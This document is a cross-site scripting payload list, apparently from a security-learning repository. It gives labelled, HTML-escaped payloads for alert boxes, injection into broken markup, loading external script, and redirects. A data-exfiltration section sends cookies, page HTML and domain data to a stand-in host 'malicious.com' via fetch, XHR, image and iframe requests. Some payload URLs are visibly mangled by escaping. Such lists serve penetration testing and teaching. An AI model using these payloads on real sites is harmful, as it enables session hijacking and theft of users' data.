CWSE/XSS/Common-XSS-Payload-List.content:
Basic Payloads

Displays a simple alert box

&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;

Shows the user’s cookie information

&lt;script&gt;alert(document.cookie)&lt;/script&gt;

Displays the domain information

&lt;script&gt;alert(document.domain)&lt;/script&gt;

Executes alert due to failed image load

&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;

Executes alert when SVG loads

&lt;svg/onload=alert(&#039;XSS&#039;)&gt;

Injection Variants

Injects script into broken HTML

&quot;&gt;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;

Runs on body load

&lt;body onload=alert(&#039;XSS&#039;)&gt;

Executes JS in iframe

&lt;iframe src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;

Injects inside input value

&lt;input type=&quot;text&quot; value=&quot;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;&quot;&gt;

Direct link execution

javascript:alert(&#039;XSS&#039;)

Triggers on mouse hover

onmouseover=&quot;alert(&#039;XSS&#039;)&quot;

Runs malicious JS in iframe

&quot;&gt;&lt;iframe src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;&lt;/iframe&gt;

Loads and executes external JS

&lt;script src=&quot;example.com/malicious-code.js&quot;&gt;&lt;/script&gt;

Executes via image element

&quot;&gt;&lt;img src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;

Executes via CSS background

&lt;div style=&quot;background:url(&#039;javascript:alert(&#039;XSS&#039;)&#039;)&quot;&gt;&lt;/div&gt;

Writes and executes script

&lt;script&gt;document.write(&#039;&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;&#039;)&lt;/script&gt;

Executes on link click

&lt;a href=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;Click me!&lt;/a&gt;

Executes via embed

&lt;embed src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;

Executes via object

&lt;object data=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;

Executes inside style import

&lt;style&gt;@import &#039;javascript:alert(&quot;XSS&quot;)&#039;;&lt;/style&gt;

Executes inside broken style import

&quot;&gt;&lt;style&gt;@import &#039;javascript:alert(&quot;XSS&quot;)&#039;;&lt;/style&gt;

Data Exfiltration

Steals cookies via fetch

&lt;script&gt;fetch(&quot;malicious.com/+document.cookie)&lt;/script&gt;

Steals cookies via redirect

&lt;script&gt;document.location=&#039;malicious.com/#039; + document.cookie;&lt;/script&gt;

Steals domain via image

&lt;script&gt;new Image().src=&#039;malicious.com/#039; + document.domain;&lt;/script&gt;

Steals HTML via image

&lt;script&gt;new Image().src=&#039;malicious.com/#039; + encodeURIComponent(document.body.innerHTML);&lt;/script&gt;

Sends cookies+URL via fetch

&lt;script&gt;fetch(&#039;malicious.com&#039;, { method: &#039;POST&#039;, body: JSON.stringify({cookie: document.cookie, location: document.location}) });&lt;/script&gt;

Deletes cookies

&lt;script&gt;document.cookie=&#039;username=; expires=Thu, 01 Jan 1970 00:00:01 GMT;&#039;;&lt;/script&gt;

Changes document domain

&lt;script&gt;document.domain=&#039;malicious.com&#039;;&lt;/script&gt;

Steals cookies via location

&quot;&gt;&lt;script&gt;document.location=&#039;malicious.com#039; + document.cookie;&lt;/script&gt;

Displays cookies via location

&quot;&gt;&lt;script&gt;document.location=&#039;javascript:alert(document.cookie)&#039;;&lt;/script&gt;

Displays domain via location

&quot;&gt;&lt;script&gt;document.location=&#039;javascript:alert(document.domain)&#039;;&lt;/script&gt;

Sends cookies via AJAX

&lt;script&gt;xhr=new XMLHttpRequest();xhr.open(&#039;GET&#039;,&#039;malicious.com#039;+document.cookie,true);xhr.send();&lt;/script&gt;

Sends domain via AJAX

&lt;script&gt;xhr=new XMLHttpRequest();xhr.open(&#039;GET&#039;,&#039;malicious.com#039;+document.domain,true);xhr.send();&lt;/script&gt;

Steals cookies via image element

&lt;script&gt;var img=document.createElement(&#039;img&#039;);img.src=&#039;malicious.com#039;+document.cookie;document.body.appendChild(img);&lt;/script&gt;

Steals domain via image element

&lt;script&gt;var img=document.createElement(&#039;img&#039;);img.src=&#039;malicious.com#039;+document.domain;document.body.appendChild(img);&lt;/script&gt;

Steals cookies via iframe

&lt;script&gt;document.write(&#039;&lt;iframe src=&quot;malicious.com#039; + document.cookie + &#039;&quot;&gt;&lt;/iframe&gt;&#039;);&lt;/script&gt;

Steals domain via iframe

&lt;script&gt;document.write(&#039;&lt;iframe src=&quot;malicious.com#039; + document.domain + &#039;&quot;&gt;&lt;/iframe&gt;&#039;);&lt;/script&gt;

Saves cookies to localStorage

&lt;script&gt;localStorage.setItem(&#039;data&#039;, document.cookie);&lt;/script&gt;

Saves domain to sessionStorage

&lt;script&gt;sessionStorage.setItem(&#039;data&#039;, document.domain);&lt;/script&gt;

Redirection Payloads

Redirects to referrer

&lt;script&gt;top.location=document.referrer;&lt;/script&gt;

Redirects opener window

&lt;script&gt;window.opener.location=&#039;malicious.com&#039;;&lt;/script&gt;

Redirects parent frame

&lt;script&gt;window.parent.location=&#039;malicious.com&#039;;&lt;/script&gt;

